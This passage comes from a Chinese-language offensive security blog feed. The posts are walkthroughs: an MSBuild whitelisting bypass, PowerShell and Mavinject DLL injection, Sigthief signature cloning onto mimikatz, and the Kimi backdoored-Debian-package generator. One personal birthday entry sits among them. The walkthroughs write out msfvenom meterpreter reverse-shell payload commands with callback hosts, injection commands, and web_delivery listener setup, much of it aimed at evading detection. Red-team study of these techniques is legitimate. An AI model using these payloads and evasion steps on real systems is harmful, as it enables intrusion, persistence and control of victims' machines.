&lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">  &lt;/UsingTask&gt;</span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure><h2 id="3-怎么运行的"><a href="#3-怎么运行的" class="headerlink" title="3.怎么运行的"></a>3.怎么运行的</h2><p>这是Casey的博客文章的直接引用。这很简单，“msbuild.exe”会为你运行C＃代码。<br>事实证明，MSBuild.exe有一个内置的功能，称为“内联任务”。这些是可以用来丰富C＃构建过程的C＃代码片段。  本质上，这是做一个XML文件，在目标的内存中编译和执行，所以它不是传统的图像&#x2F;模块执行事件。</p><h2 id="4-MSF-MSBuild-exe"><a href="#4-MSF-MSBuild-exe" class="headerlink" title="4.MSF &amp; MSBuild.exe"></a>4.MSF &amp; MSBuild.exe</h2><p>使用metasploit通过以下命令生成C＃shellcode：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">a</span> x86 –platform windows -<span class="selector-tag">p</span> windows/meterpreter/reverse_https LHOST=<span class="number">192.168</span>.<span class="number">1.1</span> LPORT=<span class="number">443</span> -f csharp</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/msbuild_shellcode.png" alt="enter description here"></p><p>在msfconsole中启动你的metasploit监听器。将您的“msbuild.exe”xml文件复制到目标系统。就我而言，这是Windows 10 Enterprise。使用以下命令执行有效内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\MSBuild<span class="selector-class">.exe</span> shellcode.xml”.</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515068611515.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515068637863.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="5-自动化生成PAYLOAD"><a href="#5-自动化生成PAYLOAD" class="headerlink" title="5.自动化生成PAYLOAD"></a>5.自动化生成PAYLOAD</h2><p>我们将使用GreatSCT来生成一个“msbuild.exe”有效载荷。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/GreatSCT/GreatSCT.git</span></span><br><span class="line">cd GreatSCT</span><br><span class="line">python3 ./gr8sct.py</span><br></pre></td></tr></table></figure><p>&nbsp;<br>按任意键开始<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515068898960.jpg" alt="enter description here"><br>&nbsp;<br>选择选项编号“0”，然后按回车。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/greatsct_msbuild_select.png" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515069148854.jpg" alt="enter description here"><br>填写 IP</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515069394562.jpg" alt="enter description here"><br>得到会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1515068637863.jpg" alt="enter description here"><br>原文链接 ：<a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/</a></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CL_Invocation | Powershell</title>
      <link href="/CL-Invocation.html"/>
      <url>/CL-Invocation.html</url>
      
        <content type="html"><![CDATA[<h1 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h1><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/CL_Invocation.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-AuthenticodeSignature C:\Windows\diagnostics\system\AERO\CL_Invocation<span class="selector-class">.ps1</span></span><br><span class="line">. C:\Windows\diagnostics\system\AERO\CL_Invocation<span class="selector-class">.ps1</span></span><br><span class="line">SyncInvoke  calc.exe</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/88B505CC0D3741C9637F5425E946920F.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux_Privilege_Escalation_Exploit</title>
      <link href="/Linux-Privilege-Escalation-Exploit.html"/>
      <url>/Linux-Privilege-Escalation-Exploit.html</url>
      
        <content type="html"><![CDATA[<p>Linux内核&lt;4.4.0-83&#x2F;&lt;4.8.0-58（Ubuntu 14.04 &#x2F; 16.04） - 特权升级漏洞<br><a href="https://0day.today/exploit/29351">https://0day.today/exploit/29351</a><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/EBB6E91EE3D5215DF59A2F5FC6542B4B.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Linux_Privilege_Escalation_Exploit.mp4'    frameborder="0"     allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字签名Sigthief |  MSF</title>
      <link href="/sigthief.html"/>
      <url>/sigthief.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DCFB5158BC5825B8D1A647230F20737C.png" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/sigthief1.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a></p><p>Sigthief是劫持合法的数字签名并绕过Windows的哈希验证机制可以被红队用于将恶意二进制文件和PowerShell脚本与本机操作系统文件混合，以逃避检测并绕过设备防护。</p><h2 id="1-首先是Github上的实例-："><a href="#1-首先是Github上的实例-：" class="headerlink" title="1.首先是Github上的实例 ："></a>1.首先是Github上的实例 ：</h2><p>  从一个二进制签名，并将其添加到另一个二进制文件</p><p>  python sigthief.py -i  c:\Windows\System32\consent.exe -t mimikatz.exe -o mimi.exe</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514901579265.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="2-借用MSF的payload"><a href="#2-借用MSF的payload" class="headerlink" title="2.借用MSF的payload"></a>2.借用MSF的payload</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514903647678.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514903672985.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514903726663.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="3-签名"><a href="#3-签名" class="headerlink" title="3.签名"></a>3.签名</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514903890073.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stage-RemoteDll | powershell -DLL-MSF</title>
      <link href="/Stage-RemoteDll.html"/>
      <url>/Stage-RemoteDll.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7AFAE845AAE84FF4B3F4659498B3C037.png" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Stage-RemoteDll.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Github  https://github.com/FuzzySecurity/PowerShell-Suite/edit/master/Stage-RemoteDll.ps1</span><br></pre></td></tr></table></figure><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>DLL注入基本上是将代码插入&#x2F;注入正在运行的进程的过程。我们注入的代码是以动态链接库（DLL）的形式。为什么？运行时需要根据需要加载DLL（如UNIX中的共享库）。在这个项目中，我将只使用DLL，但是我们实际上可以用许多其他的形式（任何PE文件，shellcode &#x2F;程序集等）来注入代码，正如在恶意软件中常见的那样。</p><p>另外，请记住，您需要具有适当级别的权限才能开始播放其他进程的内存。但是，我不会谈论受保护的进程和Windows 特权级别（在Vista中引入）。这是一个完全不同的主题。</p><p>同样，正如我上面所说，DLL注入可以用于合法的目的。例如，防病毒和端点安全解决方案使用这些技术将自己的软件代码&#x2F;钩子放入系统上的所有正在运行的进程中。这使得他们能够在运行过程中监控每个流程，更好地保护我们。也有恶意的目的。通常使用的常用技术是注入“lsass”进程以获取密码哈希值。我们都做到了。期。显然，恶意软件也广泛使用代码注入技术。要么运行shellcode，运行PE文件，要么将DLL加载到另一个进程的内存中以隐藏自身等等。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>我们将为每种技术使用MS Windows API，因为它提供了相当多的功能，允许我们附加和操作其他进程。从操作系统的第一个版本开始，DLL一直是MS Windows的基石。实际上，MS Windows API中的所有功能都包含DLL。一些最重要的是“Kernel32.dll”（包含用于管理内存，进程和线程的函数），“User32.dll”（主要是用户界面函数）和“GDI32.dll”文本显示）。</p><p>您可能想知道为什么这样的API存在，为什么微软会给我们这样一个很好的功能来播放和混淆其他进程的内存呢？主要原因是扩展应用程序的功能。例如，一个公司创建一个应用程序，并希望允许其他公司扩展或增强应用程序。所以是的，它有一个合法的使用目的。此外，DLL对于项目管理，保存内存，资源共享等都非常有用。</p><p>下图试图说明几乎每个DLL注入技术的流程。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/diagram.png" alt="enter description here"></p><p>原文链接：<a href="http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/">http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/</a></p><p>废话不多说 推主发了这个图 ，正好我想复现这个<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DMmR5z_W4AAN0_E.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>使用MSF 生成dll </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse<span class="emphasis">_tcp LHOST=192.168.1.100 LPORT=4444 -f dll &gt;demon.dll </span></span><br></pre></td></tr></table></figure><p>&nbsp;<br>启动MSF 监听<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514640392133.jpg" alt="enter description here"><br>msfconsole -r handler.rc </p><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514640345929.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p>执行PAYLOAD</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-Process notepad  (获取某个进程 )</span><br><span class="line">Import-Module .\Stage-RemoteDll.ps1   (导入远程dll 模块 )</span><br><span class="line">Stage-RemoteDll -ProcID 8208 -DllPath .\demon.dll -Mode QueueUserAPC  -Verbose  (进行dll 注入)</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514641182460.jpg" alt="enter description here"><br>最终得到会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1514640573025.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tracker | Dll Injected</title>
      <link href="/Tracker.html"/>
      <url>/Tracker.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513858216225.jpg" alt="enter description here"></p><span id="more"></span><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Tracker1.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="前天在某推看到-在一年前（subtee）发现了"><a href="#前天在某推看到-在一年前（subtee）发现了" class="headerlink" title="前天在某推看到 在一年前（subtee）发现了"></a>前天在某推看到 在一年前（subtee）发现了</h2><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513858917056.jpg" alt="enter description here"></p><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/EF953652542BEACE168119915DDAF8E9.png" alt="enter description here"></p><p> &nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513858991311.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513859183063.jpg" alt="enter description here"><br>Tracker.exe用于启动一个进程，并在创建之后将FileTracker.dll注入到该进程中。跟踪目标进程的文件访问，并在进程退出之前写入.tlog文件。</p><p>但是，如果多个线程（具有相同的中间目录）并行地（通过Tracker.exe）并行启动同一目标可执行文件的多个实例，则所有这些进程将尝试写入同名的.tlog文件* *当他们退出。如果足够的进程并行运行，这种竞争条件不可避免地导致其中一个无法打开文件进行写入（因为另一个实例已经打开），导致错误FTK1011：</p><p>FileTracker：错误FTK1011：无法创建新文件跟踪日志文件：C：\ … \ tlogs \ ipconfig.read.1.tlog。该文件存在。</p><p>我在实际应用中观察到了这一点，并将其简化为一个简单的自包含的测试用例。只需运行它，并等待控制台中出现错误（可能需要两到三次尝试，但通常至少发生一次）。</p><p>请注意，Visual Studio设法通过巧合来避免这种竞争条件 - 在构建一个包含许多C ++文件的项目时，构建系统不是同时启动多个cl.exe实例，而是构建系统启动一个实例并将所有C ++文件（然后cl.exe使用多个线程并行编译）。<br>详细信息</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513859321518.jpg" alt="enter description here"></p><h2 id="正好也是在这个月推主发推了"><a href="#正好也是在这个月推主发推了" class="headerlink" title="正好也是在这个月推主发推了"></a>正好也是在这个月推主发推了</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F5428F36171E976B3621F04D05BB2A89.png" alt="enter description here"></p><h2 id="自己也复现了一下"><a href="#自己也复现了一下" class="headerlink" title="自己也复现了一下"></a>自己也复现了一下</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513859530284.jpg" alt="enter description here"></p><p>最后也是感谢两位  Yansu 、 V@1n3R. 给我的帮助，  最终一起能复现出这个bug。</p><p>我已打包上传到 GitHub 上了  <a href="https://github.com/demonsec666/Tracker">https://github.com/demonsec666/Tracker</a></p><p><a href="https://connect.microsoft.com/VisualStudio/feedback/details/1655214/msbuild-tracker-exe-race-condition-when-called-in-parallel-for-instances-of-the-same-exe">https://connect.microsoft.com/VisualStudio/feedback/details/1655214/msbuild-tracker-exe-race-condition-when-called-in-parallel-for-instances-of-the-same-exe</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mavinject | Dll Injected</title>
      <link href="/mavinject.html"/>
      <url>/mavinject.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/14CCE2557B1CD2558BBFCA878F0EF92E.jpg" alt="enter description here"></p><span id="more"></span><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/mavinjec.mp4'    frameborder="0"     allowfullscreen></iframe><p>DLL注入<br>什么是DLL注入？DLL注入是将 DLL 注入进程的内存空间，然后将其作为其一部分执行的过程。这样做意味着DLL代码具有对进程内存的所有访问权限，无论出于何种原因都可以对其进行操作，但更重要的是，它还获得了进程的所有权限。例如，您希望与外界沟通，但您没有通过防火墙的权限。随着注入DLL，你可以注入并执行你的代码到其中的过程确实有权限（如Internet Explorer），这将是能够做什么它需要。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513775930135.jpg" alt="enter description here"><br>如果有人对如何编写一个基本的DLL注入器感兴趣，请让我知道下面。</p><p>用户模式Rootkit<br>用户模式rootkit是提供与内核模式rootkit类似功能的rootkit（尽管在技术上不是这样），例如屏蔽和禁止访问文件，但在用户级别操作。我们把这个级别称为ring 3，而内核模式rootkit是ring 0。这些戒指是什么？这是一个视觉辅助图。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513775561212.jpg" alt="enter description here"></p><p>我们可以看到，绿色是用户模式，中间的红色是内核模式。尽管环1和环2确实存在，但实际上并不使用，所以我们只是指0或3。</p><p>从环3调用WinAPI函数调用，因为环3不能直接与CPU通信，所以必须通过一系列特权检查向内环0进行响铃。一旦进入响铃0，操作系统执行指令来执行函数调用所需的操作。通过这样做，API 相信从环3传递到0并返回的参数将保持其完整性而不被修改。</p><h2 id="mavinject"><a href="#mavinject" class="headerlink" title="mavinject"></a>mavinject</h2><p>Mavinject是一个合法的Windows组件，可以在任何正在运行的进程中使用和滥用，执行任意代码注入。由于这是Windows上的一个常见组件，因此可以利用它来执行无人区域的攻击。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513778423174.jpg" alt="enter description here"></p><p>进一步分析后，我们被解雇的事件为假阳性，但我们仍然受到触发的原因，为什么一个合法的部分将执行这样的操作的原因感到困惑  EXCEL.EXE。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/events-768x180.png" alt="enter description here"><br>在时间轴方面，mavinject32.exe在excel.exe中执行代码注入 ，然后立即终止。这引起了一些关于引擎操作可能带有恶意并且开始跟踪端点行为的担忧。以下是违规程序的细节：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/proc-details-768x226.png" alt="enter description here"></p><p>现在很清楚，mavinject32.exe是一个合法的 Microsoft组件。命令行也很有趣，因为从初步分析来看，论据似乎如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mavinject32.exe <span class="language-xml"><span class="tag">&lt;<span class="name">PID</span>&gt;</span></span> <span class="language-xml"><span class="tag">&lt;<span class="name">PATH</span> <span class="attr">DLL</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>实际上是在端点上运行的excel.exe实例的PID，其路径与在“事件”期间注入的DLL 的路径相对应。“mav-inject”的名字应该已经相当透露了，在这一点上，我们怀疑它可能被用来（和滥用）在任何其他进程中注入任意的恶意DLL。</p><p>作为第一步，我们尝试了解Mavinject是否是共同的组件; 我们在以下位置的不同端点上找到它：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe&quot;</span><br></pre></td></tr></table></figure><p>此外，可执行文件可以在其他两个目录中找到：System32和SysWOW64。</p><p>文件描述显示组件是什么：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileDescription:  Microsoft Application Virtualization Injector</span><br></pre></td></tr></table></figure><p>该应用程序是Microsoft Application Virtualization（App-V）的一部分。可执行文件的分析使我们得到以下有趣的参数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/INJECTRUNNING</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1513776172973.jpg" alt="enter description here"></p><p>使用Mavinject …<br>在收集到来自不同客户的更多信息之后，我们确定了一个常见的用例：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mavinject <span class="language-xml"><span class="tag">&lt;<span class="name">PID</span>&gt;</span></span> /INJECTRUNNING</span><br></pre></td></tr></table></figure><p>使用此命令行运行的可执行文件查找以下注册表项：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer\HKEY<span class="emphasis">_LOCAL_</span>MACHINE\SOFTWARE\Microsoft\AppV\Subsystem</span><br></pre></td></tr></table></figure><p>其相应的值是：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ValueName: Modules - ValueData: C:\Windows\System32\AppVEntSubsystems32.dll</span><br><span class="line">ValueName: Modules64 - ValueData: C:\Windows\System32\AppVEntSubsystems64.dll</span><br></pre></td></tr></table></figure><p>根据目标进程体系结构（32位或64位），它会注入其中一个DLL。</p><p>虐待Mavinject …<br>经过进一步分析，很明显的是，同样的确切机制可以被滥用以下方式注入一个DLL在一个任意的运行过程中：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MavInject.exe <span class="language-xml"><span class="tag">&lt;<span class="name">PID</span>&gt;</span></span> /INJECTRUNNING <span class="language-xml"><span class="tag">&lt;<span class="name">PATH</span> <span class="attr">DLL</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DRGMJzHVQAEZMxn.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DRGMovJWsAAMNDD.jpg" alt="enter description here"></p><p>参考资料 ：dll  <a href="https://gist.github.com/anonymous/b25cb82c4b3d40648f0b589fa242577f">https://gist.github.com/anonymous/b25cb82c4b3d40648f0b589fa242577f</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/052530D337AEFC1DDEC731D041FF3608.jpg" alt="enter description here"><br><a href="https://reaqta.com/2017/12/mavinject-microsoft-injector/">https://reaqta.com/2017/12/mavinject-microsoft-injector/</a>  从假阳性到真阳性：微软注射器Mavinject.exe的故事<br><a href="https://twitter.com/subTee/status/942779279623913473">https://twitter.com/subTee/status/942779279623913473</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-5123  |kali linux 2017</title>
      <link href="/CVE-2017-5123.html"/>
      <url>/CVE-2017-5123.html</url>
      
        <content type="html"><![CDATA[<p>github :<br><a href="https://github.com/nongiach/CVE">https://github.com/nongiach/CVE</a></p><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE20175123.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<p>如果出现<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1509627258574.jpg" alt="enter description here"><br>那就:apt-get install qemu-system-x86</p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>祝自己生日快乐</title>
      <link href="/happy-birthday.html"/>
      <url>/happy-birthday.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508628330668.jpg" alt="enter description here"></p><span id="more"></span><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=486403266&auto=1&height=66"></iframe><p>每年的今天似乎都是一个人过的生日，但是没想到的是今年却在病魔中渡过的。</p><p>自己依稀记得自己模模糊糊的接到了父亲的三次电话，都是在问我，：“儿子，病好点了吗”  “好点了。。。。”</p><p>昨晚也是收到母亲的安慰，那时候感觉真的是亲情的可贵，世界最温暖人心的还是亲情。当在病魔中挣扎的时候，</p><p>想起了很多年母亲带我看医生的时候，如今只有一个人看病。小时候有母亲给我买的玩具，却是安心的陪母亲上</p><p>医院。如今只有母亲和父亲的短短几句话，感觉真的人生足矣！那晚哭了 。十几年不落泪的我，居然哭了，哭的</p><p>很伤心。想问，时间去哪儿了。父母亲虽然老了，但是对我的爱却是永恒不变的。</p><p>怕自己老了，忘事。将其这美好的事情记录下来<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/59FD210598B5CA9B830E96E2CC6E927E.jpg" alt="enter description here"></p><h2 id="最后祝自己生日快乐！！！！"><a href="#最后祝自己生日快乐！！！！" class="headerlink" title="最后祝自己生日快乐！！！！"></a>最后祝自己生日快乐！！！！</h2></b><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508628364893.jpg" alt="enter description here"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux_inject_kimi | MSF | kali linux 2017</title>
      <link href="/Linux-inject-kimi.html"/>
      <url>/Linux-inject-kimi.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Linux-inject-kimi.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Kimi的名字灵感来源于“Kimimaro”，是动画片“火影忍者”的动画片之一。</span><br><span class="line">Kimi是一个为metasploit生成恶意debian软件包的脚本</span><br><span class="line">它由bash文件组成。 bash文件被部署到“/usr/local /bin/”目录中。</span><br><span class="line">当受害者尝试安装deb包由于postinst文件时，后门被执行</span><br><span class="line">Bash文件注入，也像一些受害者执行时的系统命令</span><br><span class="line">攻击者与会话点击。</span><br><span class="line"><span class="bullet">-</span> 完全独立 意味着用户不需要安装任何debian包创建者</span><br><span class="line"><span class="bullet">-</span> 可以与任何有效载荷发生器集成，</span><br><span class="line">Kimi基本上取决于web<span class="emphasis">_delivery模块，每件事情都是自动化的。</span></span><br><span class="line"><span class="emphasis">所有的攻击者需要做以下设置：</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508039936984.jpg" alt="enter description here"></p><pre>msf > use exploit/multi/script/web_deliverymsf exploit(web_delivery) > set srvhost 192.168.0.102srvhost => 192.168.0.102msf exploit(web_delivery) > set uripath /SecPatchuripath => /SecPatchmsf exploit(web_delivery) > set Lhost 192.168.0.102Lhost => 192.168.0.102msf exploit(web_delivery) > show optionsmsf exploit(web_delivery) > exploit</pre><p>github: <a href="https://github.com/ChaitanyaHaritash/kimi">https://github.com/ChaitanyaHaritash/kimi</a></p></p><strong><span style="color: #ff0000;">声明：本文内容仅供交流学习使用，一切由使用者造成的法律问题，均由使用者自行承担！本站及作者概不负责！</span></strong></p>制作这种过程也是很简单,先来简单的看下帮助参数<pre>  -h, --help         列举一些帮助参数  -n NAME,  -n  参数 后面需要跟上Deb包的名称  -l LHOST, --lhost （-l 参数 后面需要跟上本机的IP地址）                        LHOST, for Handler  -V VERS,  （-V 参数跟上随意指定版本信息以区分之前的包）  -a ARCH, --arch ARCH  Architecture (i386/amd64) （-a 参数 需指定平台架构 如i386/amd64）</pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>那么我们来简单看下需要用的参数:<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041138026.jpg" alt="enter description here"><br>&nbsp;</p><p>1.首先需要一个Deb 包：我这里随便弄了个包 之前有在 <a href="http://www.ggsec.cn/Debinject.html">http://www.ggsec.cn/Debinject.html</a> 用到过。<br>我这里重命名为f。便于写。<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041076595.jpg" alt="enter description here"><br>那么-n 的参数跟上 f （以包名称为准）</p><p>2.填上ip地址 -l 192.168.1.103<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041273641.jpg" alt="enter description here"><br>&nbsp;</p><p> 3.添加平台架构  -a amd64 (我这里是64位的 所以填写amd64，根据目标机情况填写 )<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041369868.jpg" alt="enter description 